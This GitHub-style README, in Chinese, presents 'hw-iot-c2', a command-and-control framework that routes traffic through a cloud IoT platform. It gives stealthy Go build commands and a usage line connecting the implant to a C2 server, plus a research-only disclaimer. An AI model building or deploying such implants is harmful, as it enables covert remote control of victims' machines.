# hw-iot-c2
一款利用某云厂商的物联网平台作为c2的框架

make:
```go
CGO_ENABLED=0 GOOS=windows GOARCH=amd64 go build -ldflags="-s -w -H=windowsgui"  -o hw-iot-c2.exe .
CGO_ENABLED=0 GOOS=linux GOARCH=amd64 go build -ldflags="-s -w"  -o hw-iot-c2 .
```

use:
```
hw-iot-c2.exe -id xxx_xx -pass xxxxxxxx -server tls://xxx.xxx.myhuaweicloud.com:8883
```

原文：

![image](https://github.com/UltimateSec/ultimaste-nuclei-templates/blob/main/qrcode.jpg)

# 免责声明：
本文章或工具仅供安全研究使用，请勿利用从事非法测试，由于传播、利用此文所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，极致攻防实验室及作者不为此承担任何责任。

